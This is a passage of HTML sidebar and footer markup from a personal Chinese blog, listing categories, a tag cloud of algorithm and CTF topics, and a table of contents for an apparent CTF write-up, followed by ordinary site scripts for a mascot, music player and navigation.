href="/categories/OI/CodeForces/"><div class="name">CodeForces</div><div class="badge">(3)</div></a></li><li><a class="flat-box child" title="/categories/OI/%E6%B4%9B%E8%B0%B7/" href="/categories/OI/%E6%B4%9B%E8%B0%B7/"><div class="name">洛谷</div><div class="badge">(9)</div></a></li><li><a class="flat-box" title="/categories/%E5%85%B6%E4%BB%96/" href="/categories/%E5%85%B6%E4%BB%96/"><div class="name">其他</div><div class="badge">(1)</div></a></li><li><a class="flat-box" title="/categories/%E6%9E%81%E5%AE%A2/" href="/categories/%E6%9E%81%E5%AE%A2/"><div class="name">极客</div><div class="badge">(9)</div></a></li><li><a class="flat-box child" title="/categories/%E6%9E%81%E5%AE%A2/Linux/" href="/categories/%E6%9E%81%E5%AE%A2/Linux/"><div class="name">Linux</div><div class="badge">(2)</div></a></li><li><a class="flat-box child" title="/categories/%E6%9E%81%E5%AE%A2/Windows/" href="/categories/%E6%9E%81%E5%AE%A2/Windows/"><div class="name">Windows</div><div class="badge">(3)</div></a></li><li><a class="flat-box child" title="/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" href="/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><div class="name">环境配置</div><div class="badge">(2)</div></a></li><li><a class="flat-box" title="/categories/%E8%BD%AC%E8%BD%BD/" href="/categories/%E8%BD%AC%E8%BD%BD/"><div class="name">转载</div><div class="badge">(1)</div></a></li></ul></div></section><section class="card-shadow blur widget tagcloud"><header><div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 热门标签</div></header><div class="content"><a href="/tags/BFS/" style="font-size:16.5px;color:#888">BFS</a> <a href="/tags/DP/" style="font-size:19px;color:#777">DP</a> <a href="/tags/HGAME/" style="font-size:16.5px;color:#888">HGAME</a> <a href="/tags/HWS/" style="font-size:16.5px;color:#888">HWS</a> <a href="/tags/Hackergame/" style="font-size:14px;color:#999">Hackergame</a> <a href="/tags/Linux/" style="font-size:16.5px;color:#888">Linux</a> <a href="/tags/N1BOOK/" style="font-size:14px;color:#999">N1BOOK</a> <a href="/tags/PHP/" style="font-size:19px;color:#777">PHP</a> <a href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size:14px;color:#999">PHP伪协议</a> <a href="/tags/PowerShell/" style="font-size:14px;color:#999">PowerShell</a> <a href="/tags/SQLi/" style="font-size:16.5px;color:#888">SQLi</a> <a href="/tags/STL/" style="font-size:21.5px;color:#666">STL</a> <a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size:14px;color:#999">其他</a> <a href="/tags/%E5%9B%BE%E8%AE%BA/" style="font-size:14px;color:#999">图论</a> <a href="/tags/%E6%8E%92%E5%BA%8F/" style="font-size:14px;color:#999">排序</a> <a href="/tags/%E6%95%B0%E5%AD%A6/" style="font-size:16.5px;color:#888">数学</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:14px;color:#999">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:14px;color:#999">文件包含</a> <a href="/tags/%E6%9E%9A%E4%B8%BE/" style="font-size:14px;color:#999">枚举</a> <a href="/tags/%E6%A0%91%E4%B8%8A%E9%97%AE%E9%A2%98/" style="font-size:16.5px;color:#888">树上问题</a> <a href="/tags/%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/" style="font-size:14px;color:#999">树链剖分</a> <a href="/tags/%E6%A6%82%E7%8E%87%E6%9C%9F%E6%9C%9B/" style="font-size:14px;color:#999">概率期望</a> <a href="/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/" style="font-size:14px;color:#999">线段树</a> <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/" style="font-size:14px;color:#999">蓝帽杯</a> <a href="/tags/%E8%B4%AA%E5%BF%83/" style="font-size:16.5px;color:#888">贪心</a> <a href="/tags/%E8%BD%AF%E4%BB%B6/" style="font-size:24px;color:#555">软件</a></div></section><section class="card-shadow blur widget toc-wrapper"><header><div><i class="fas fa-list fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 文章目录</div><div class="wrapper"><a class="s-toc rightBtn" rel="external nofollow noopener noreferrer" href="javascript:void(0)"><i class="fas fa-thumbtack fa-fw"></i></a></div></header><div class="content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#USB"><span class="toc-text">USB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Animals"><span class="toc-text">Animals</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt"><span class="toc-text">fmt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-text">RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-text">random</span></a></li></ol></li></ol></div></section></aside><script>NProgress.inc(.6)</script></div></div><div id="live2d-container"><canvas id="live2d" width="165" height="350" style="pointer-events:none"></canvas></div><footer id="footer" class="clearfix"><div><i class="fa fa-copyright">&nbsp;2018 - 2024</i> <span style="font-weight:700">&nbsp;&nbsp;|&nbsp;&nbsp;</span> <i class="fa fa-heart">&nbsp;&nbsp;sxyugao</i></div><div class="social-wrapper"><a href="/rss.xml" class="social fas fa-rss" target="_blank" rel="external"></a> <a href="mailto:sxyugao@qq.com" class="social fas fa-envelope" target="_blank" rel="external"></a> <a href="https://wpa.qq.com/msgrd?v=3&amp;uin=2645943187&amp;site=qq&amp;menu=yes" class="social fab fa-qq" target="_blank" rel="external"></a> <a href="https://github.com/sxyugao" class="social fab fa-github" target="_blank" rel="external"></a> <a href="https://music.163.com/#/user/home?id=536677549" class="social fas fa-headphones-alt" target="_blank" rel="external"></a></div><span>本站已经元气满满地运行了</span><span id="htmer_time"></span> <i class="fa fa-heart heart"></i><div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p></div></footer><script>NProgress.inc(.7)</script><script>function isMobile(){let i=navigator.userAgent,n=["Android","iPhone","SymbianOS","Windows Phone","iPod","iPad"];for(let e of n)if(i.indexOf(e)>=0)return!0;return!1}</script><link href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css" rel="stylesheet"><script defer="defer" src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script><script type="text/javascript">$((function(){Waves.attach(".flat-box",["waves-block"]),Waves.init()}))</script><script src="https://cdn.jsdelivr.net/gh/sxyugao/Website/js/live2d.js"></script><script>isMobile()||L2Dwidget.init({model:{jsonPath:"https://cdn.jsdelivr.net/gh/sxyugao/Website/live2d/assets/koharu.model.json"}})</script><link href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" rel="stylesheet"><script defer="defer" src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script defer="defer" src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script><script>if(!isMobile()){let e='<meting-js theme="#3273dc" fixed=true autoplay="false" server="netease" type="playlist" id="7263710447" volume="0.7"></meting-js>';$("#live2d-container").before(e);let t=setInterval((()=>{let e=document.querySelector("meting-js").aplayer;e&&(e.lrc.hide(),clearInterval(t))}),100)}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet"><script defer="defer" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script id="ribbon" src="https://cdn.jsdelivr.net/gh/sxyugao/Website/js/canvas-ribbon.js"></script><script src="https://cdn.jsdelivr.net/gh/sxyugao/Website/js/search.js"></script><script src="/js/app.js"></script><script>$(document).ready((()=>{reset(),NProgress.done()}))</script><script type="text/javascript">$(document).pjax("a","#pjax-container",{fragment:"#pjax-container",timeout:5e3}).on("pjax:start",(()=>{NProgress.start()})).on("pjax:complete",(()=>{reset(),NProgress.done()}))</script></body></html>